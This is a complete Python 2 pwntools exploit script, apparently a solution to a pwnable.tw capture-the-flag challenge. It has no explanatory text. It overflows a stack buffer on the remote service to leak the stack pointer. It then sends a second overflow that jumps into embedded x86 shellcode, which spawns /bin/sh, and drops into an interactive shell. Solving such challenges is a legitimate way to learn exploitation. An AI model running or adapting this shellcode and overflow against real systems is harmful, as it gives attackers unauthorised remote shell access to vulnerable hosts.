from pwn import *
from binascii import unhexlify

conn = remote('chall.pwnable.tw', 10000)

payload1 = 'a'*20 + p32(0x08048087)
shellcode = unhexlify("31c050682f2f7368682f62696e89e3505389e199b00bcd80")

print conn.recvuntil(':')
conn.send(payload1)
#esp = u32(conn.recv(4))
received = conn.recv()
esp = u32(received[:4])
print
print "ESP : {}".format(hex(esp))
payload2 = 'a'*20 + p32(esp+20) +shellcode
conn.sendline(payload2)
conn.interactive()
print "---DONE---"